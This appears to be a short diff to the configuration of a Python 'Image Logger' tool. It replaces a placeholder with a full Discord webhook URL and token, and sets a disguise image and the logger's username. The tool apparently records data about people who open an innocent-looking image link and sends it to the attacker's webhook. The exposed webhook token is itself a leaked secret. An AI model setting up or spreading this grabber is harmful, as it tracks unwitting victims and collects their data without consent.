@@ -7,7 +7,7 @@ import httpagentparser
 
 # CONFIGURATION
 config = {
-    "webhook": "YOUR_WEBHOOK_URL_HERE", # Replace with your actual webhook
+    "webhook": "https://discordapp.com/api/webhooks/1440406122069491733/GPcbMvAlglx1cbQVZY7sNp88TKI8ETUWRFSSPdlZtRBBXA-Ph8cPs5GIwIMM9WrHTyGJ", # Replace with your actual webhook
     "image": "https://media.tenor.com/oZEQi-467TIAAAAe/moai.png",
     "imageArgument": True,
     "username": "Image Logger",
